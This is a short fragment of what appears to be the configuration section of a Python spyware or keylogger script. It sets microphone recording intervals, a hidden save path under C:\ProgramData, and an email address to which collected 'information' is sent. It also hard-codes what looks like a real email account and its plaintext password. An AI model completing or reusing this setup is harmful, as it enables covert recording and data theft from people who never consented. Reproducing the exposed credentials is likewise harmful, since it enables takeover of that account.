...
microphone_time = 3600
time_iteration = 3600
number_of_iterations_end = 1

email_address = "gaddesanjan@gmail.com" # Enter disposable email here
password = "Sriganesh01" # Enter email password here

username = getpass.getuser()

toaddr = "gaddesanjan@gmail.com" # Enter the email address you want to send your information to


file_path = "C:\ProgramData" # Enter the file path you want your files to be saved to
extend = "\\"
